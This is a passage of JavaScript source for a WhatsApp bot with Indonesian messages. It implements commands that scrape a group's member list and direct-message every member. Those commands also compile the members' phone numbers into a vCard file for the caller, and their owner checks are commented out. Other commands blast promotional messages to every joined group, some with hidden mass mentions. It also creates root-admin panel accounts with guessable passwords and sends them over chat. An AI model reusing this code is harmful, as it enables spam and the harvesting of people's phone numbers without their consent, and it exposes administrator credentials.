          await Reza.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
          contacts.splice(0, contacts.length)
          await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
          await fs.writeFileSync("./all/database/contacts.vcf", "")
        }
      }
        break
      case "pushkontak1": {
        // if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
        if (!text.split("|")) return SkyReply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
        var [idnya, teks] = text.split("|")
        var groupMetadataa
        try {
          groupMetadataa = await Reza.groupMetadata(`${idnya}`)
        } catch (e) {
          return SkyReply("*ID Grup* tidak valid!")
        }
        const participants = await groupMetadataa.participants
        const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
        let time = ms(delaypushkontak * Number(halls.length))
        await SkyReply(`Proses Mengirim Pesan Ke *${halls.length} Member Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
        for (let mem of halls) {
          if (mem !== m.sender) {
            contacts.push(mem)
            await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
            await Reza.sendMessage(mem, { text: teks }, { quoted: qchanel })
            await sleep(global.delaypushkontak)
          }
        }
        try {
          const uniqueContacts = [...new Set(contacts)]
          const vcardContent = uniqueContacts.map((contact, index) => {
            const vcard = [
              "BEGIN:VCARD",
              "VERSION:3.0",
              `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
              `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
              "END:VCARD",
              "",].join("\n")
            return vcard
          }).join("")
          fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
        } catch (err) {
          SkyReply(err.toString())
        } finally {
          if (m.chat !== m.sender) await SkyReply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
          await Reza.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
          contacts.splice(0, contacts.length)
          await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
          await fs.writeFileSync("./all/database/contacts.vcf", "")
        }
      }
        break
      case "pushkontak2": {
        // if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
        if (!text.split("|")) return SkyReply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
        var idnya = text.split("|")[0]
        var delay = Number(text.split("|")[1])
        var teks = text.split("|")[2]
        if (!idnya.endsWith("@g.us")) return SkyReply("Format ID Grup Tidak Valid")
        if (isNaN(delay)) return SkyReply("Format Delay Tidak Valid")
        if (!teks) return SkyReply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
        var groupMetadataa
        try {
          groupMetadataa = await Reza.groupMetadata(`${idnya}`)
        } catch (e) {
          return SkyReply("*ID Grup* tidak valid!")
        }
        const participants = await groupMetadataa.participants
        const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
        let time = ms(delay * Number(halls.length))
        await SkyReply(`Proses Mengirim Pesan Ke *${halls.length} Member Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
        for (let mem of halls) {
          if (mem !== m.sender) {
            contacts.push(mem)
            await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
            await Reza.sendMessage(mem, { text: teks }, { quoted: qchanel })
            await sleep(Number(delay))
          }
        }
        try {
          const uniqueContacts = [...new Set(contacts)]
          const vcardContent = uniqueContacts.map((contact, index) => {
            const vcard = [
              "BEGIN:VCARD",
              "VERSION:3.0",
              `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
              `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
              "END:VCARD",
              "",].join("\n")
            return vcard
          }).join("")
          fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
        } catch (err) {
          SkyReply(err.toString())
        } finally {
          if (m.chat !== m.sender) await SkyReply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
          await Reza.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
          contacts.splice(0, contacts.length)
          await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
          await fs.writeFileSync("./all/database/contacts.vcf", "")
        }
      }
        break
      case "idgc": {
        // if (!isOwner) return SkyReply(msg.owner)
        if (!isGroup) return SkyReply(msg.group)
        SkyReply(`${m.chat}`)
      }
        break
      case "listgc": case "cekidgc": case "listgrup": {
        let gcall = Object.values(await Reza.groupFetchAllParticipating().catch(_ => null))
        let listgc = '\n'
        await gcall.forEach((u, i) => {
          listgc += `*${i + 1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
        })
        Reza.sendMessage(m.chat, {
          text: `${listgc}`, contextInfo: {
            mentionedJid: [m.sender], externalAdReply: {
              thumbnail: await getBuffer(ppuser), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`, sourceUrl: global.linkyt, previewType: "PHOTO"
            }
          }
        }, { quoted: qchanel })
      }
        break
      case "tescek": {
        let gcall = Object.values(await Reza.groupFetchAllParticipating().catch(_ => null))
        let listgc = ''
        await gcall.forEach((u, i) => {
          listgc += `${u.id}`
        })
        Reza.sendMessage(m.chat, {
          text: `${listgc}`, contextInfo: {
            mentionedJid: [m.sender], externalAdReply: {
              thumbnail: await getBuffer(ppuser), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`, sourceUrl: global.linkyt, previewType: "PHOTO"
            }
          }
        }, { quoted: qchanel })
      }
        break
      case "joingc": case "join": {
        if (!isOwner) return SkyReply(msg.owner)
        if (!text && !m.quoted) return SkyReply(example('linknya'))
        let teks = m.quoted ? m.quoted.text : text
        if (!teks.includes('whatsapp.com')) return SkyReply("Link Tautan Tidak Valid!")
        let result = teks.split('https://chat.whatsapp.com/')[1]
        await Reza.groupAcceptInvite(result).then(respon => SkyReply("Berhasil Bergabung Ke Dalam Grup ✅")).catch(error => SkyReply(error.toString()))
      }
        break
      case "leave": case "leavegc": {
        if (!isOwner) return SkyReply(msg.owner)
        if (!isGroup) return SkyReply(msg.group)
        await SkyReply("Otw Bosss")
        await sleep(3000)
        await Reza.groupLeave(m.chat)
      }
        break
      case "leavegc2": case "leave2": {
        if (!isOwner) return SkyReply(msg.owner)
        let gcall = await Object.values(await Reza.groupFetchAllParticipating().catch(_ => null))
        let num = []
        let listgc = `*Contoh Cara Penggunaan :*\nKetik *${cmd}* Nomor Grup\n\n`
        await gcall.forEach((u, i) => {
          num.push(i)
          listgc += `*${i + 1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
        })
        if (!args[0]) {
          Reza.sendMessage(m.chat, {
            text: `${listgc}`, contextInfo: {
              mentionedJid: [m.sender], externalAdReply: {
                thumbnail: await getBuffer(ppuser), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`, sourceUrl: global.linkyt, previewType: "PHOTO"
              }
            }
          }, { quoted: qchanel })
        } else if (args[0]) {
          if (!num.includes(Number(args[0]) - 1)) return SkyReply("Grup tidak ditemukan")
          let leav = Number(args[0]) - 1
          await SkyReply(`Berhasil Keluar Dari Grup :\n*${gcall[leav].subject}*`)
          await Reza.groupLeave(`${gcall[leav].id}`)
        }
      }
        break
      case "rst": case "restartbot": {
        if (!isOwner) return SkyReply(msg.owner)
        await SkyReply("Memproses Restart Bot . . .")
        execSync("npm restart")
      }
        break
      case "scbot": case "sc":
      case "scriptbot": {
        if (isOwner) {
          SkyReply("Memproses Pengambilan Scriptbot")
          let a = getTime().split("T")[1].split("+")[0]
          var name = `V5Private⚡`
          const ls = (await execSync("ls"))
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "node_modules" &&
                pe != "session" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != ""
            )
          const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
          await Reza.sendMessage(m.sender, {
            document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`,
            mimetype: "application/zip"
          }, { quoted: m })
          await execSync(`rm -rf ${name}.zip`)
          if (m.chat !== m.sender) return SkyReply("Scriptbot Berhasil Dikirim Ke Chat Pribadi")
        } else {
          let teks = `*# Script ${namabot}*

Script Bot Ini Tidak Di Bagikan Secara *Gratis!!*

Jika Anda Berminat Ingin Membeli Script Ini, Silahkan Chat *Ownerbot* Dengan Cara Ketik *.owner*

*➡️ Youtube :*
${global.linkyt}

*➡️ Grup Jualan :*
${global.linkgc}

*➡️ Testimoni :*
${global.linksaluran}`
          Reza.relayMessage(m.chat, { requestPaymentMessage: { currencyCodeIso4217: 'IDR', amount1000: 1000000, requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: teks, contextInfo: { externalAdReply: { showAdAttribution: true } } } } } }, {})
        }
      }
        break
      case "done": {
        if (isGroup) return SkyReply(msg.private)
        if (!isOwner) return SkyReply(msg.owner)
        if (!text) return reply(example("barang,harga\n\n*Contoh :* Panel Unlimited,2"))
        if (!text.split(",")) return reply(example("barang,harga\n\n*Contoh :* Panel Unlimited,2"))
        const [barang, harga] = text.split(",")
        if (isNaN(harga)) return reply("Format Harga Tidak Valid")
        var total = `${harga}000000`
        var total2 = Number(`${harga}000`)
        let teksnya = `
*📦 ${barang}*
*💸 Rp${toRupiah(total2)}
*⏰ ${tanggal(Date.now())}*`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [m.sender]
                }, body: proto.Message.InteractiveMessage.Body.create({
                  text: teksnya
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
                  },
                  {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Grup Jual Beli\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                  }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qpayment })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "startjpm": {
        if (!isOwner) return SkyReply(msg.owner)
        var teksnya = await fs.readFileSync("./list/teksjpm.js").toString()
        if (teksnya.length < 1) return SkyReply("Teks Jpm Tidak Ditemukan, Silahkan Isi/Edit Teks Jpm Didalam Folder all/database")
        var teks = `${teksnya}`
        let total = 0
        let getGroups = await Reza.groupFetchAllParticipating()
        let usergc = await Object.keys(getGroups)
        let time = ms(delayjpm * Number(usergc.length))
        await SkyReply(`Proses Mengirim Pesan Ke Teks *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [m.sender],
                  externalAdReply: {
                    showAdAttribution: false
                  }
                }, body: proto.Message.InteractiveMessage.Body.create({
                  text: teksnya
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
                  }, {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
                  },
                  {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Marketplace\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                  }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qtoko })
        for (let jid of usergc) {
          try {
            await Reza.relayMessage(jid, msgii.message, {
              messageId: msgii.key.id
            })
            total += 1
          } catch { }
          await sleep(4000)
        }
        SkyReply(`Berhasil Mengirim Pesan Teks Ke *${total} Grup*`)
      }
        break
      case "jpmhidetag": case "jpmht": {
        if (!isOwner) return SkyReply(msg.owner)
        if (!text && !m.quoted) return SkyReply(example("teksnya atau replyteks"))
        var teks = m.quoted ? m.quoted.text : text
        let total = 0
        let getGroups = await Reza.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
        let usergc = groups.map((v) => v.id)
        let time = ms(delayjpm * Number(usergc.length))
        await SkyReply(`Proses Mengirim Pesan Hidetag Teks Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
        var ments = []
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: ments,
                  externalAdReply: {
                    showAdAttribution: false
                  }
                }, body: proto.Message.InteractiveMessage.Body.create({
                  text: teks
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
                  }, {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
                  },
                  {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                  }]
                }),
              })
            }
          }
        }, { userJid: m.sender, quoted: qtoko })
        for (let jid of usergc) {
          try {
            ments = getGroups[jid].participants.map(e => e.id)
            await Reza.relayMessage(jid, msgii.message, {
              messageId: msgii.key.id
            })
            total += 1
          } catch (e) {
            console.log(e)
          }
          await sleep(global.delayjpm)
        }
        SkyReply(`Berhasil Mengirim Pesan Hidetag Teks Ke *${total} Grup*`)
      }
        break
      case "jpmhidetag2": case "jpmht2": {
        if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply(example("teksnya dengan balas/kirim foto"))
        if (!/image/.test(mime)) return SkyReply(example("teksnya dengan balas/kirim foto"))
        let image = await Reza.downloadAndSaveMediaMessage(qmsg)
        var teks = text
        let total = 0
        let getGroups = await Reza.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
        let usergc = groups.map((v) => v.id)
        let time = ms(delayjpm * Number(usergc.length))
        await SkyReply(`Proses Mengirim Pesan Hidetag Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
        var ments = []
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: ments,
                  externalAdReply: {
                    showAdAttribution: false
                  }
                }, body: proto.Message.InteractiveMessage.Body.create({
                  text: teks
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
                  },
                  {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
                  },
                  {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                  }]
                }),
              })
            }
          }
        }, { userJid: m.sender, quoted: qtoko })
        for (let jid of usergc) {
          try {
            ments = getGroups[jid].participants.map(e => e.id)
            await Reza.relayMessage(jid, msgii.message, {
              messageId: msgii.key.id
            })
            total += 1
          } catch (e) {
            console.log(e)
          }
          await sleep(global.delayjpm)
        }
        SkyReply(`Berhasil Mengirim Pesan Hidetag Teks & Foto Ke *${total} Grup*`)
      }
        break
      case "jpm": {
        // if (!isOwner) return SkyReply(msg.owner)
        if (!text && !m.quoted) return SkyReply(example("teksnya atau replyteks"))
        var teks = m.quoted ? m.quoted.text : text
        let total = 0
        let getGroups = await Reza.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
        let usergc = groups.map((v) => v.id)
        let time = ms(delayjpm * Number(usergc.length))
        await SkyReply(`Proses Mengirim Pesan Teks Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [m.sender],
                  externalAdReply: {
                    showAdAttribution: false
                  }
                }, body: proto.Message.InteractiveMessage.Body.create({
                  text: teks
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
                  }, {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
                  },
                  {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                  }]
                }),
              })
            }
          }
        }, { userJid: m.sender, quoted: qtoko })
        for (let jid of usergc) {
          try {
            await Reza.relayMessage(jid, msgii.message, {
              messageId: msgii.key.id
            })
            total += 1
          } catch { }
          await sleep(global.delayjpm)
        }
        SkyReply(`Berhasil Mengirim Pesan Teks Ke *${total} Grup*`)
      }
        break
      case "jpm2": {
        if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply(example("teksnya dengan balas/kirim foto"))
        if (!/image/.test(mime)) return SkyReply(example("teksnya dengan balas/kirim foto"))
        let image = await Reza.downloadAndSaveMediaMessage(qmsg)
        if (global.idsaluran == "-") return SkyReply('Isi Dulu ID Saluran Lu Di File Settings.js!')
        let total = 0
        let getGroups = await Reza.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
        let usergc = groups.map((v) => v.id)
        let time = ms(delayjpm * Number(usergc.length))
        await SkyReply(`Proses Mengirim Pesan Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [m.sender],
                  externalAdReply: {
                    showAdAttribution: false
                  }
                }, body: proto.Message.InteractiveMessage.Body.create({
                  text: text
                }), header: proto.Message.InteractiveMessage.Header.create({
                  hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync(image) }, { upload: Reza.waUploadToServer }))
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
                  }, {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
                  },
                  {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                  }]
                }),
              })
            }
          }
        }, { userJid: m.sender, quoted: qtoko })
        for (let jid of usergc) {
          try {
            await Reza.relayMessage(jid, msgii.message, {
              messageId: msgii.key.id
            })
            total += 1
          } catch { }
          await sleep(global.delayjpm)
        }
        await fs.unlinkSync(image)
        SkyReply(`Berhasil Mengirim Pesan Teks & Foto Ke *${total} Grup*`)
      }
        break
      case "jpmslide": case "startjpmslide": {
        if (!isOwner) return SkyReply(msg.owner)
        let total = 0
        let getGroups = await Reza.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
        let usergc = groups.map((v) => v.id)
        let time = ms(delayjpm * Number(usergc.length))
        let imgsc = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/Reza.jpg") }, { upload: Reza.waUploadToServer })
        const msgii = await generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              }, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({
                  text: "*All Transaksi Open ✅*\n\n*Slimemarket* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
                }),
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                  cards: [{
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      title: `${hargamarket}`,
                      hasMediaAttachment: true,
                      ...imgsc
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [{
                        name: "cta_url",
                        buttonParamsJson: `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
                      }]
                    })
                  },
                  {
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      title: `${hargapanel}`,
                      hasMediaAttachment: true,
                      ...imgsc
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [{
                        name: "cta_url",
                        buttonParamsJson: `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
                      }]
                    })
                  },
                  {
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      title: `${hargasuntik}`,
                      hasMediaAttachment: true,
                      ...imgsc
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [{
                        name: "cta_url",
                        buttonParamsJson: `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
                      }]
                    })
                  }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qtoko })
        await SkyReply(`Proses Mengirim Pesan Slide Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
        for (let jid of usergc) {
          try {
            await Reza.relayMessage(jid, msgii.message, { messageId: msgii.key.id })
            total += 1
          } catch { }
          await sleep(global.delayjpm)
        }
        await SkyReply(`Berhasil Mengirim Pesan Slide Teks & Foto Ke *${total} Grup*`)
      }
        break
      case "addadmin": {
        if (!text) return SkyReply(example("username"))
        if (!isOwner) return SkyReply(msg.owner)
        let username = text.toLowerCase()
        let email = username + "@gmail.com"
        let name = capital(args[0])
        let password = username + crypto.randomBytes(2).toString('hex')
        let f = await fetch(domain + "/api/application/users", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          },
          "body": JSON.stringify({
            "email": email,
            "username": username.toLowerCase(),
            "first_name": name,
            "last_name": "Admin",
            "root_admin": true,
            "language": "en",
            "password": password.toString()
          })
        })
        let data = await f.json();
        if (data.errors) return SkyReply(JSON.stringify(data.errors[0], null, 2))
        let user = data.attributes
        var orang
        if (isGroup) {
          orang = m.sender
          await SkyReply("*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
        } else {
          orang = m.chat
        }
        var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Password :* ${password}
* *Created :* ${user.created_at.split("T")[0]}
`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [m.sender],
                  externalAdReply: {
                    showAdAttribution: true
                  }
                }, body: proto.Message.InteractiveMessage.Body.create({
                  text: teks
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
                  },
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
                  },
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
                  }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qchanel })
        await Reza.relayMessage(orang, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "addadmin2": {
        if (!text) return SkyReply(example("nama,6283XXX"))
        if (!isOwner) return SkyReply(msg.owner)
        if (!args[0]) return SkyReply(example("nama,6283XXX"))
        if (!text.split(",")) return SkyReply(example("nama,6283XXX"))
        var buyyer = text.split(",")[0].toLowerCase()
        if (!buyyer) return SkyReply(example("nama,6283XXX"))
        var ceknya = text.split(",")[1]
        if (!ceknya) return SkyReply(example("nama,6283XXX"))
        var client = text.split(",")[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        var check = await Reza.onWhatsApp(ceknya)
        if (!check[0].exists) return SkyReply("Nomor Buyyer Tidak Valid!")
        let username = buyyer.toLowerCase()
        let email = username + "@gmail.com"
        let name = capital(username)
        let password = username + crypto.randomBytes(2).toString('hex')
        let f = await fetch(domain + "/api/application/users", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          },
          "body": JSON.stringify({
            "email": email,
            "username": username.toLowerCase(),
            "first_name": name,
            "last_name": "Admin",
            "root_admin": true,
            "language": "en",
            "password": password.toString()
          })
        })
        let data = await f.json();
        if (data.errors) return SkyReply(JSON.stringify(data.errors[0], null, 2))
        let user = data.attributes
        await SkyReply(`*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${ceknya}`)
        var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}
`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [m.sender],
                  externalAdReply: {
                    showAdAttribution: true
                  }
                }, body: proto.Message.InteractiveMessage.Body.create({
                  text: teks
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
                  },
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
                  },
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
                  }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qchanel })
        await Reza.relayMessage(client, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "deladmin": {
